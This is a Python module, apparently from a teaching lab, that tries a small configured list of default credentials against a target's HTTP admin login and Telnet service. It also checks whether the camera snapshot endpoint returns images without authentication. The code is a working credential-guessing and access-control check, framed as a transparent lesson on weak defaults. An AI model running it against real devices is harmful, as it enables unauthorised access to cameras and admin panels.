"""Guided default-credential exploitation against the target's HTTP admin
panel and Telnet stub, plus a broken-access-control check on the snapshot
endpoint.

Deliberately uses the small, visible `DEFAULT_CREDENTIALS` list from
config.py rather than a large real-world wordlist or a tool like Hydra: the
goal is to teach the concept (weak/default credentials, OWASP I1) with full
transparency about what is being tried and why, not to be a general brute
forcer.
"""
import socket

import requests

from app.config import DEFAULT_CREDENTIALS, SOCKET_TIMEOUT_SECONDS

HTTP_PORT = 80
TELNET_PORT = 23


def try_http_login(ip: str) -> list[dict]:
    attempts = []
    url = f"http://{ip}:{HTTP_PORT}/login"
    for username, password in DEFAULT_CREDENTIALS:
        try:
            resp = requests.post(
                url,
                data={"username": username, "password": password},
                timeout=SOCKET_TIMEOUT_SECONDS,
                allow_redirects=False,
            )
            success = resp.status_code in (302, 303) and "session" in resp.cookies
            attempts.append(
                {
                    "service": "http",
                    "username": username,
                    "password": password,
                    "success": success,
                    "note": "Login accepted" if success else "Rejected",
                }
            )
            if success:
                break
        except requests.RequestException as exc:
            attempts.append(
                {
                    "service": "http",
                    "username": username,
                    "password": password,
                    "success": False,
                    "note": f"Could not reach HTTP service: {exc}",
                }
            )
            break
    return attempts


def try_telnet_login(ip: str) -> list[dict]:
    attempts = []
    for username, password in DEFAULT_CREDENTIALS:
        try:
            with socket.create_connection((ip, TELNET_PORT), timeout=SOCKET_TIMEOUT_SECONDS) as sock:
                sock.settimeout(SOCKET_TIMEOUT_SECONDS)
                sock.recv(256)  # "Username: " prompt
                sock.sendall(f"{username}\r\n".encode())
                sock.recv(256)  # "Password: " prompt
                sock.sendall(f"{password}\r\n".encode())
                reply = sock.recv(256).decode(errors="replace")
                success = "welcome" in reply.lower()
                attempts.append(
                    {
                        "service": "telnet",
                        "username": username,
                        "password": password,
                        "success": success,
                        "note": reply.strip() or ("Login accepted" if success else "Rejected"),
                    }
                )
                if success:
                    break
        except OSError as exc:
            attempts.append(
                {
                    "service": "telnet",
                    "username": username,
                    "password": password,
                    "success": False,
                    "note": f"Could not reach Telnet service: {exc}",
                }
            )
            break
    return attempts


def check_unauthenticated_snapshot(ip: str) -> dict:
    url = f"http://{ip}:{HTTP_PORT}/snapshot.jpg"
    try:
        resp = requests.get(url, timeout=SOCKET_TIMEOUT_SECONDS)
        reachable = resp.status_code == 200 and resp.headers.get("content-type", "").startswith("image")
        return {
            "service": "snapshot",
            "success": reachable,
            "note": (
                "Live camera snapshot retrieved with no authentication at all"
                if reachable
                else f"Snapshot endpoint not reachable unauthenticated (HTTP {resp.status_code})"
            ),
        }
    except requests.RequestException as exc:
        return {"service": "snapshot", "success": False, "note": f"Could not reach snapshot endpoint: {exc}"}
